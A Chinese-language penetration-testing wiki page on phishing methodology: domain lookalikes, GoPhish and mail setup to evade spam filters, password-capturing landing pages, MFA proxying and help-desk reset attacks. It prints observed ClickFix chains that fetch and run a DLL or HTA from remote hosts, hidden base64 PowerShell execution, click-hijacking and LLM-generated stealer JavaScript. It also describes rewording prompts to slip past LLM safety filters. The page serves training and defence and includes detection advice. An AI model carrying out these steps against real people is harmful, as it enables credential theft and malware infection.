# Phishing 方法论

{{#include ../../banners/hacktricks-training.md}}

## 方法论

1. Recon 受害者
1. 选择**受害者域名**。
2. 执行一些基础的 Web 枚举，**搜索受害者使用的登录门户**，并**决定**要**冒充**哪一个。
3. 使用一些 **OSINT** 来**查找电子邮件**。
2. 准备环境
1. **购买域名**，用于 phishing assessment
2. **配置与 email service 相关的**记录（SPF、DMARC、DKIM、rDNS）
3. 使用 **gophish** 配置 VPS
3. 准备 campaign
1. 准备**电子邮件模板**
2. 准备用于窃取凭据的**网页**
4. Launch campaign！

## 生成相似域名或购买受信任的域名

### 域名变体技术

- **Keyword**：域名**包含**原始域名的重要**关键词**（例如：zelster.com-management.com）。<sup>[[1]](#references)</sup>
- **hypened subdomain**：将子域名中的**点替换为连字符**（例如：www-zelster.com）。
- **New TLD**：使用**新的 TLD** 的相同域名（例如：zelster.org）
- **Homoglyph**：将域名中的某个字母替换为**外观相似的字母**（例如：zelfser.com）。


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition**：交换域名中的**两个字母**（例如：zelsetr.com）。
- **Singularization/Pluralization**：在域名末尾添加或删除“s”（例如：zeltsers.com）。
- **Omission**：从域名中**删除一个**字母（例如：zelser.com）。
- **Repetition**：**重复**域名中的一个字母（例如：zeltsser.com）。
- **Replacement**：类似于 Homoglyph，但隐蔽性较低。将域名中的一个字母替换为其他字母，例如键盘上靠近原始字母的字母（例如：zektser.com）。
- **Subdomained**：在域名内部加入一个**点**（例如：ze.lster.com）。
- **Insertion**：向域名中**插入一个字母**（例如：zerltser.com）。
- **Missing dot**：将 TLD 附加到域名上。（例如：zelstercom.com）

**自动化工具**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**网站**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

由于太阳耀斑、宇宙射线或硬件错误等多种因素，存储中或通信中的某些 bit **可能会被自动翻转**。

当这一概念**应用于 DNS 请求**时，**DNS server 接收到的域名**可能与最初请求的域名不同。

例如，对域名“windows.com”进行单个 bit 修改后，可能会将其变为“windnws.com”。

攻击者可能会**通过注册多个 bit-flipping 域名来利用这一点**，这些域名与受害者的域名相似。他们的目的是将合法用户重定向到自己的基础设施。

如需更多信息，请阅读 [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)。<sup>[[10]](#references)[[11]](#references)</sup>

### 购买受信任的域名

你可以在 [https://www.expireddomains.net/](https://www.expireddomains.net) 中搜索可用的过期域名。\
为了确保准备购买的过期域名**已经具有良好的 SEO**，可以搜索它在以下网站中的分类：

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## 发现电子邮件

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester)（100% 免费）
- [https://phonebook.cz/](https://phonebook.cz)（100% 免费）
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

为了**发现更多**有效的电子邮件地址，或**验证已经发现的地址**，可以检查是否能够对受害者的 SMTP servers 进行 brute-force。[在此了解如何验证/发现电子邮件地址](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration)。\
此外，不要忘记，如果用户使用**任何 Web portal 访问其邮件**，可以检查其是否容易受到**username brute force** 的攻击，并在可能的情况下利用该漏洞。

## 配置 GoPhish

### 安装

你可以从 [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) 下载。

将其下载并解压到 `/opt/gophish` 中，然后执行 `/opt/gophish/gophish`\
输出中会提供 port 3333 上 admin user 的密码。因此，访问该端口并使用这些凭据修改 admin password。你可能需要将该端口 tunnel 到本地：
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### 配置

**TLS 证书配置**

在此步骤之前，你应该**已经购买了**要使用的**域名**，并且该域名必须**指向**你配置 **gophish** 的 **VPS IP**。
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**邮件配置**

开始安装：`apt-get install postfix`

然后将域名添加到以下文件中：

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

同时修改 `/etc/postfix/main.cf` 中以下变量的值：

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

最后，将文件 **`/etc/hostname`** 和 **`/etc/mailname`** 修改为你的域名，并**重启 VPS。**

现在，创建一个 **DNS A record**，将 `mail.<domain>` 指向 VPS 的 **IP address**，再创建一个指向 `mail.<domain>` 的 **DNS MX** record。

现在让我们测试发送一封 email：
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish 配置**

停止 gophish 的运行并进行配置。\
将 `/opt/gophish/config.json` 修改为以下内容（注意使用 https）：
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**配置 gophish 服务**

为了创建 gophish 服务，使其能够自动启动并作为服务进行管理，你可以创建文件 `/etc/init.d/gophish`，内容如下：
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
完成服务配置并执行以下检查：
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## 配置 mail server 和 domain

### 等待并保持合法

domain 越老，被识别为 spam 的可能性就越低。因此，你应在 phishing assessment 之前尽可能等待更长时间（至少 1 周）。此外，如果你创建一个关于具有良好 reputational 的 sector 的页面，所获得的 reputation 会更好。

请注意，即使必须等待一周，你现在也可以完成所有配置。

### 配置 Reverse DNS (rDNS) record

设置一个 rDNS (PTR) record，使 VPS 的 IP address 解析到该 domain name。

### Sender Policy Framework (SPF) Record

你必须**为新 domain 配置 SPF record**。如果你不知道 SPF record 是什么，请[**阅读此页面**](../../network-services-pentesting/pentesting-smtp/index.html#spf)。

你可以使用 [https://www.spfwizard.net/](https://www.spfwizard.net) 生成 SPF policy（使用 VPS machine 的 IP）

![用于为 phishing domain 生成 SPF record 的 SPF Wizard 表单](<../../images/image (1037).png>)

以下内容必须设置在 domain 内部的 TXT record 中：
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### 基于域的消息身份验证、报告与一致性 (DMARC) 记录

你必须**为新域配置 DMARC 记录**。如果你不知道什么是 DMARC 记录，请[**阅读此页面**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc)。

你需要创建一个新的 DNS TXT 记录，将主机名 `_dmarc.<domain>` 指向以下内容：
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

你必须**为新域配置 DKIM**。如果你不知道什么是 DKIM record，请[**阅读此页面**](../../network-services-pentesting/pentesting-smtp/index.html#dkim)。

本教程基于：[https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)。<sup>[[5]](#references)</sup>

> [!TIP]
> 你需要将 DKIM key 生成的两个 B64 值连接起来：
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### 测试你的 email 配置评分

你可以使用 [https://www.mail-tester.com/](https://www.mail-tester.com) 完成此操作\
只需访问该页面，并向他们提供的地址发送一封 email：
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
你还可以通过向 `check-auth@verifier.port25.com` 发送邮件并**阅读响应**来**检查你的 email 配置**（为此，你需要**开放**端口 **25**；如果你以 root 身份发送邮件，请在文件 _/var/mail/root_ 中查看响应）。\
检查你是否通过了所有测试：
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
你也可以向你控制的 **Gmail 发送消息**，然后在 Gmail 收件箱中检查 **email 的 headers**，`Authentication-Results` header 字段中应存在 `dkim=pass`。
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​从 Spamhouse 黑名单中移除

[www.mail-tester.com](https://www.mail-tester.com) 页面可以提示你的域名是否被 spamhouse 阻止。你可以在 ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/) 请求移除你的域名/IP。

### 从 Microsoft 黑名单中移除

​​你可以在 [https://sender.office.com/](https://sender.office.com) 请求移除你的域名/IP。

## 创建并启动 GoPhish Campaign

### 发送配置文件

- 设置一个用于**识别**发送者配置文件的**名称**
- 决定你将从哪个账户发送 phishing emails。建议使用：_noreply、support、servicedesk、salesforce..._
- 用户名和密码可以留空，但请确保勾选 Ignore Certificate Errors

![创建并启动 GoPhish Campaign - 发送配置文件：用户名和密码可以留空，但请确保勾选 Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> 建议使用 "**Send Test Email**" 功能测试一切是否正常。\
> 我建议将测试 emails 发送到 10min mails 地址，以避免在测试时被列入黑名单。

### Email Template

- 设置一个用于**识别**模板的**名称**
- 然后编写一个**主题**（不要使用奇怪的内容，只需填写你预期在常规 email 中看到的内容）
- 确保已勾选 "**Add Tracking Image**"
- 编写 **email template**（你可以像以下示例一样使用变量）：
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
请注意，**为了提高邮件的可信度**，建议使用一封来自客户的邮件中的某些签名。建议：

- 向一个**不存在的地址**发送邮件，并检查回复中是否包含签名。
- 搜索 **public emails**，例如 info@ex.com、press@ex.com 或 public@ex.com，向其发送邮件并等待回复。
- 尝试联系某个**已发现的有效**邮箱，并等待回复

![Sending Profile - Email Template: 尝试联系某个已发现的有效邮箱并等待回复](<../../images/image (80).png>)

> [!TIP]
> Email Template 还允许**附加要发送的文件**。如果你还希望使用特制的文件/文档窃取 NTLM challenges，请[阅读此页面](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)。

### Landing Page

- 设置一个**名称**
- **编写网页的 HTML 代码**。注意，你可以**导入**网页。
- 勾选 **Capture Submitted Data** 和 **Capture Passwords**
- 设置**重定向**

![Email Template - Landing Page: 勾选 Capture Submitted Data 和 Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> 通常，你需要修改页面的 HTML 代码，并在本地进行一些测试（可能使用某个 Apache server），**直到你对结果满意为止。**然后，将 HTML 代码写入文本框。\
> 注意，如果你需要为 HTML **使用某些静态资源**（例如 CSS 和 JS 页面），可以将其保存到 _**/opt/gophish/static/endpoint**_，然后通过 _**/static/\<filename>**_ 访问。

> [!TIP]
> 对于重定向，你可以将用户**重定向到受害者的合法主页**，或者将他们重定向到 _/static/migration.html_，例如放置一个**旋转加载图标（**[**https://loading.io/**](https://loading.io)**)，等待 5 秒，然后提示操作成功**。

### Users & Groups

- 设置名称
- **导入数据**（注意，要使用本示例的 template，你需要每个用户的 firstname、last name 和 email address）

![Landing Page - Users & Groups: 导入数据（注意，要使用本示例的 template，你需要每个用户的 firstname、last name 和 email address）](<../../images/image (163).png>)

### Campaign

最后，创建一个 campaign，选择名称、email template、landing page、URL、sending profile 和 group。注意，URL 将是发送给受害者的链接。

注意，**Sending Profile 允许发送测试邮件，以查看最终的 phishing email 效果**：

![Users & Groups - Campaign: 注意，Sending Profile 允许发送测试邮件，以查看最终的 phishing email 效果](<../../images/image (192).png>)

一切准备就绪后，只需启动 campaign！

## Website Cloning

如果出于任何原因你想要克隆网站，请查看以下页面：


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

在某些 phishing assessments 中（主要针对 Red Teams），你还可能希望**发送包含某种 backdoor 的文件**（可能是 C2，也可能只是触发 authentication 的文件）。\
以下页面提供了一些示例：


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

之前的攻击相当巧妙，因为你伪造了真实网站并收集用户输入的信息。不幸的是，如果用户没有输入正确的密码，或者你伪造的应用程序配置了 2FA，**这些信息将无法让你冒充被诱骗的用户**。

这正是 [**evilginx2**](https://github.com/kgretzky/evilginx2)**、**[**CredSniper**](https://github.com/ustayready/CredSniper) 和 [**muraena**](https://github.com/muraenateam/muraena) 等工具发挥作用的地方。这些工具允许你生成类似 MitM 的攻击。基本上，攻击按以下方式进行：

1. 你**伪造**真实网页的**登录**表单。
2. 用户将其**credentials**发送到你的伪造页面，工具再将其发送到真实网页，**检查 credentials 是否有效**。
3. 如果账户配置了 **2FA**，MitM 页面会要求用户提供 2FA；用户**输入**后，工具会将其发送到真实网页。
4. 用户完成 authentication 后，你（作为 attacker）将在工具执行 MitM 期间**捕获 credentials、2FA、cookie 以及每次交互中的所有信息**。

### Via VNC

如果不将**受害者引导到外观与原始页面相同的恶意页面**，而是将其引导到一个**连接着真实网页浏览器的 VNC session**，会怎样？你将能够看到他执行的操作，窃取密码、使用的 MFA、cookies……\
你可以使用 [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) 完成此操作。<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

显然，判断自己是否已经暴露的最佳方式之一，是**在 blacklists 中搜索你的 domain**。如果你的 domain 出现在其中，说明它可能已经被检测为可疑。\
检查你的 domain 是否出现在任何 blacklist 中的一种简单方法，是使用 [https://malwareworld.com/](https://malwareworld.com)

不过，还有其他方法可以判断受害者是否在**主动寻找现实环境中的可疑 phishing 活动**，具体说明见：


{{#ref}}
detecting-phising.md
{{#endref}}

你可以**购买一个名称与受害者 domain 非常相似的 domain**，和/或为你控制的 domain 的**subdomain 生成 certificate**，其中包含受害者 domain 的**keyword**。如果**受害者**与这些 domain 进行任何形式的 **DNS 或 HTTP interaction**，你就会知道他在**主动寻找**可疑 domain，因此你需要非常隐蔽。<sup>[[2]](#references)</sup>

### Evaluate the phishing

使用 [**Phishious** ](https://github.com/Rices/Phishious)评估你的邮件是否会进入 spam folder、被阻止，或成功送达。

## High-Touch Identity Compromise (Help-Desk MFA Reset)

现代 intrusion sets 越来越多地完全跳过 email lures，转而**直接针对 service-desk / identity-recovery workflow** 来绕过 MFA。该攻击完全采用 "living-off-the-land" 方式：一旦 operator 获取了有效 credentials，就会使用内置的 admin tooling 进行 pivot——无需 malware。<sup>[[6]](#references)</sup>

### Attack flow
1. Recon 受害者
* 从 LinkedIn、data breaches、public GitHub 等来源收集个人和 corporate details。
* 识别高价值身份（executives、IT、finance），并枚举密码 / MFA reset 的**确切 help-desk 流程**。
2. Real-time social engineering
* 冒充目标联系 help-desk（通过电话、Teams 或 chat），通常使用 **spoofed caller-ID** 或 **cloned voice**。
* 提供此前收集的 PII，以通过基于知识的验证。
* 说服 agent **reset MFA secret**，或对已注册的 mobile number 执行 **SIM-swap**。
3. Immediate post-access actions（真实案例中 ≤60 min）
* 通过任意 web SSO portal 建立 foothold。
* 使用内置工具枚举 AD / AzureAD（不落地 binaries）：
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* 使用环境中已列入 allowlist 的 **WMI**、**PsExec** 或合法 **RMM** agents 进行 lateral movement。

### Detection & Mitigation
* 将 help-desk identity recovery 视为**特权操作**——要求 step-up auth 和 manager approval。
* 部署 **Identity Threat Detection & Response (ITDR)** / **UEBA** 规则，在以下情况发出 alert：
* MFA method changed + 从新 device / geo 进行 authentication。
* 同一 principal 立即发生 elevation（user-→-admin）。
* 记录 help-desk calls，并在执行任何 reset 前，强制**回拨已注册的号码**进行确认。
* 实施 **Just-In-Time (JIT) / Privileged Access**，确保 newly reset accounts **不会自动继承高权限 tokens**。

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews 通过 mass attacks 抵消 high-touch ops 的成本，将**search engines 和 ad networks 转变为 delivery channel**。<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** 将 `chromium-update[.]site` 等 fake result 推送到 search ads 顶部。
2. 受害者下载一个小型 **first-stage loader**（通常是 JS/HTA/ISO）。Unit 42 观察到的示例：
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader 外传 browser cookies 和 credential DBs，然后拉取一个 **silent loader**，由其进行实时决策，确定是否部署：
* RAT（例如 AsyncRAT、RustDesk）
* ransomware / wiper
* persistence component（registry Run key + scheduled task）

### Hardening tips
* 屏蔽 newly-registered domains，并在 search-ads 和 e-mail 上都强制启用 **Advanced DNS / URL Filtering**。
* 将 software installation 限制为 signed MSI / Store packages，并通过 policy 禁止执行 `HTA`、`ISO`、`VBS`。
* 监控 browser 打开 installers 时产生的 child processes：
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* 搜索 first-stage loaders 经常滥用的 LOLBins（例如 `regsvr32`、`curl`、`mshta`）。

### Download-button click hijacking with TDS handoff
一些 fake software portals 会让可见的 download `href` 指向**真实的 GitHub/release URL**，但通过 JavaScript 劫持用户的**第一次**交互，并将受害者转入 **Traffic Distribution System (TDS)** chain。<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
关键特征：
- 该 hook 通常在 `document` 上的 **capture phase**（`true`）中运行，因此会先于网站 handlers 触发。
- Chrome 通常使用 `mousedown` 而不是 `click`，以便将 redirect 绑定到有效的 **user gesture**，并提高绕过 popup blocker 的成功率。
- 某些变体会预先打开 `about:blank`，或模拟点击 `<a target="_blank">`，之后才设置 TDS URL。
- 浏览器端的限制通常保存在 `localStorage` 中，因此**首次点击**可能会访问 malware，而刷新或重试时则回退到看似 benign 的可见链接。
- TDS 可以根据 referrer、entry domain、GEO、浏览器/设备 fingerprint、VPN/datacenter 检查、click context 以及每个 session 的计数器进行筛选，从而使 analyst 的重放结果具有非确定性。

防御思路：
- 对比**显示的** `href` 与点击时生成的**实际** navigation target。
- 搜索 `document.addEventListener(..., true)` handlers，尤其是同时调用 `preventDefault()` 和 `stopImmediatePropagation()`，并围绕 `window.open`、`about:blank` 或模拟 anchor 点击执行操作的 handlers。
- 将一批新注册的软件下载域名全部加载相同 CloudFront/JS stage 的情况，视为高信号的 SEO-poisoning/TDS 模式。

### 来自 fake verification pages 的 ClickFix + 类似 archive 的 LOLBAS fetches
某些 TDS 分支最终会进入 fake verification page（Cloudflare/IUAM 风格），提示受害者运行一个受信任的 Windows binary，例如：<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
说明：
- `mshta.exe` 会执行响应开头的 **HTA/VBScript**，即使 URL 伪装成 `.7z` archive；追加的 archive 数据可能只是纯诱饵。
- 后续阶段通常会继续伪装文件类型（PowerShell 使用 `.rtf`，Python 使用 `.asar`，ZIP 中放置填充过的 binaries），随后切换到 **manual PE mapping / in-memory execution**。
- 如果你正在响应此类攻击链，请从首次成功运行开始保留 **network + memory**：后续重放可能只显示 benign installer/SFX 路径，或因 payload/key release 绑定到原始 TDS session 而失败。

### ClickFix DLL delivery tradecraft（伪造 CERT 更新）
* 诱饵：克隆的 national CERT advisory，带有一个显示分步“修复”指示的 **Update** 按钮。受害者会被告知运行一个 batch，该 batch 下载 DLL 并通过 `rundll32` 执行。<sup>[[12]](#references)</sup>
* 观察到的典型 batch chain：
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` 将 payload 写入 `%TEMP%`，短暂 sleep 用于隐藏 network jitter，随后 `rundll32` 调用 exported entrypoint（`notepad`）。
* DLL beacon 发送 host identity，并每隔几分钟轮询 C2。Remote tasking 以 **base64-encoded PowerShell** 的形式到达，在隐藏状态下并通过 policy bypass 执行：
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* 这种方式保留了 C2 flexibility（server 可以更换 tasks，而无需更新 DLL），并隐藏 console windows。结合 `-WindowStyle Hidden`、`FromBase64String` 和 `Invoke-Expression`，搜索 `rundll32.exe` 的 PowerShell 子进程。
* Defenders 可以查找形如 `...page.php?tynor=<COMPUTER>sss<USER>` 的 HTTP(S) callbacks，以及 DLL load 后每 5 分钟一次的 polling intervals。

---

## AI-Enhanced Phishing Operations
攻击者目前会串联 **LLM & voice-clone APIs**，用于完全个性化的诱饵和实时交互。

| Layer | Threat actor 的示例用法 |
|-------|-----------------------------|
|Automation|生成并发送超过 100 k 封 emails / SMS，使用随机化措辞和 tracking links。|
|Generative AI|生成*一次性* emails，引用公开的 M&A、社交媒体中的内部笑话；在 callback scam 中使用 deep-fake CEO voice。|
|Agentic AI|自主注册 domains、抓取 open-source intel，并在受害者点击但未提交 creds 时制作下一阶段 mails。|

**Defence：**
• 添加 **dynamic banners**，突出显示由不受信任的 automation 发送的 messages（通过 ARC/DKIM anomalies）。
• 为高风险 phone requests 部署 **voice-biometric challenge phrases**。
• 在 awareness programmes 中持续模拟 AI-generated lures——static templates 已经过时。

另请参阅——用于 credential phishing 的 agentic browsing abuse：

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

另请参阅——AI agent 对本地 CLI tools 和 MCP 的 abuse（用于 secrets inventory 和 detection）：

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript（in-browser codegen）

攻击者可以发送看似 benign 的 HTML，并通过请求 **trusted LLM API** 生成 stealer，然后在 browser 中执行（例如使用 `eval` 或动态 `<script>`）。<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation：** 在 prompt 中编码 exfil URLs/Base64 strings；反复调整措辞以绕过 safety filters 并减少 hallucinations。
2. **Client-side API call：** 加载时，JS 调用 public LLM（Gemini/DeepSeek/etc.）或 CDN proxy；static HTML 中只包含 prompt/API call。
3. **Assemble & exec：** 拼接 response 并执行它（每次访问生成 polymorphic 版本）：
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil：**生成的代码会个性化 lure（例如解析 LogoKit token），并将 creds 发送到隐藏在 prompt 中的 endpoint。

**Evasion traits**
- 流量会访问知名 LLM 域名或信誉良好的 CDN proxies；有时通过 WebSockets 连接到 backend。
- 没有静态 payload；恶意 JS 仅在 render 后存在。
- 非确定性生成会为每个 session 生成**独特的 stealers**。

**Detection ideas**
- 运行启用 JS 的 sandbox；标记**源自 LLM 响应的 runtime `eval`/动态 script 创建**。
- 搜索向 LLM APIs 发起的前端 POST，以及紧接着对返回文本执行的 `eval`/`Function`。
- 对 client 流量中未经授权的 LLM 域名，以及随后发生的 credential POST 发出告警。

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
除了经典的 push-bombing，operators 还会在 help-desk 通话期间直接**强制进行新的 MFA registration**，使用户现有的 token 失效。之后出现的任何 login prompt 对 victim 而言都会显得合法。
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
监控 AzureAD/AWS/Okta 事件：**`deleteMFA` + `addMFA`** 是否在几分钟内从同一 IP 发生。



## 剪贴板劫持 / Pastejacking

攻击者可以从被入侵或 typosquatted 的网页中，将恶意命令静默复制到受害者的剪贴板，然后诱骗用户将其粘贴到 **Win + R**、**Win + X** 或终端窗口中，在无需下载文件或附件的情况下执行任意代码。


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## 移动端 Phishing 与恶意 App 分发（Android 与 iOS）


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### 通过 QR 社会工程劫持 WhatsApp 设备关联
* 诱导页面（例如伪造的 ministry/CERT “channel”）显示 WhatsApp Web/Desktop QR，并指示受害者扫描它，从而在受害者不知情的情况下将攻击者添加为**关联设备**。<sup>[[12]](#references)</sup>
* 攻击者会立即获得聊天和联系人可见性，直到该 session 被移除。受害者之后可能会看到“新设备已关联”通知；防御人员可以在访问不受信任的 QR 页面后不久，搜寻异常的设备关联事件。

### 通过移动端门控 Phishing 规避 crawlers/sandboxes
攻击者越来越多地通过简单的设备检查来控制其 Phishing 流程，使 desktop crawlers 无法到达最终页面。一种常见模式是使用小型 script 检测是否存在支持触控的 DOM，并将结果 POST 到 server endpoint；非移动端客户端会收到 HTTP 500（或空白页面），而移动端用户则会看到完整流程。<sup>[[7]](#references)</sup>

最小客户端代码片段（典型逻辑）：
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` 逻辑（简化版）：
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
经常观察到的 Server 行为：
- 在首次加载期间设置 session cookie。
- 接受 `POST /detect {"is_mobile":true|false}`。
- 当 `is_mobile=false` 时，后续 GET 返回 500（或占位内容）；仅当 `true` 时提供 phishing 内容。

Hunting 和 detection 启发式方法：
- urlscan 查询：`filename:"detect_device.js" AND page.status:500`
- Web telemetry：`GET /static/detect_device.js` → `POST /detect` → 非 mobile 请求返回 HTTP 500；合法的 mobile victim 路径返回 200，并继续加载 HTML/JS。
- Block 或仔细检查仅根据 `ontouchstart` 或类似 device checks 来决定内容的页面。

防御建议：
- 使用类似 mobile 的 fingerprints 并启用 JS 来执行 crawlers，以发现 gated content。
- 对新注册 domains 上 `POST /detect` 后出现的可疑 500 响应发出 alert。

## References

- [1] [生成 Phishing 中使用的 Domain Variations（Zeltser）](https://zeltser.com/domain-name-variations-in-phishing/)
